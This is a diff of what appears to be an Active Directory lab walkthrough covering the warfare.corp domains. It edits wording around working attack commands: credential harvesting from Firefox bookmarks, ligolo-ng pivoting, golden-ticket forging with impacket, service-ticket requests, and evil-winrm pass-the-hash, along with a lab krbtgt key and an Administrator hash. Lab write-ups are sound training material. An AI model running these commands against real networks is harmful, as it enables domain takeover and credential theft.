@@ -95,9 +95,9 @@ ens34: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 
 
-### Creds in Firefoz Bookmarks
+### Creds in Firefox Bookmarks
 
-Print the Table `moz_bookmarks` of the places.sqlite db and we obtain a AD credential
+Print the Table `moz_bookmarks` of the `places.sqlite` db and we obtain a AD credential
 
 {% code overflow="wrap" %}
 ```bash
@@ -142,9 +142,8 @@ tar -xvzf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
 
 Set up the attacker machine
 
-```bash
-sudo ip tuntap add user kali mode tun ligolo
-
+<pre class="language-bash"><code class="lang-bash"><strong>sudo ip tuntap add user kali mode tun ligolo
+</strong>
 #Delete the 192.168.98.0/24 IP Range from the tun0 interface :
 sudo ip route del 192.168.98.0/24 dev tun0
 
@@ -153,7 +152,7 @@ sudo ip link set ligolo up
 
 #Add 192.168.98.0/24 IP range to the ligolo interface :
 sudo ip route add 192.168.98.0/24 dev ligolo
-```
+</code></pre>
 
 ```bash
 # start the proxy on attacker machine
@@ -261,7 +260,7 @@ krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1
 [..snip..]
 ```
 
-Now get the all SID required to forge the ticket
+Now we have to get all SID required to forge the ticket
 
 ```bash
 impacket-lookupsid child/corpmngr:'User4&*&*'@warfare.corp
@@ -289,6 +288,8 @@ impacket-ticketer -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08
 
 ### Use the Golden Ticket
 
+Now that we have a TGT ticket, we can craft an ST for access to the PARENT DC.
+
 {% code overflow="wrap" %}
 ```bash
 export KRB5CCNAME=corpmngr.ccache
@@ -297,7 +298,7 @@ impacket-getST -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corp
 ```
 {% endcode %}
 
-...???
+Once we have created the ST, dump credentials with impacket or access through the SMB into machine.
 
 ```bash
 export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
@@ -311,6 +312,8 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdf
 
 
 ### Access as Administrator
+
+Pass-the-Hash in Evil-Winrm&#x20;
 
 ```bash
 evil-winrm -i 192.168.98.2 -u 'warfare\Administrator' -H 'a2f7b77b62cd97161e18be2ffcfdfd60'
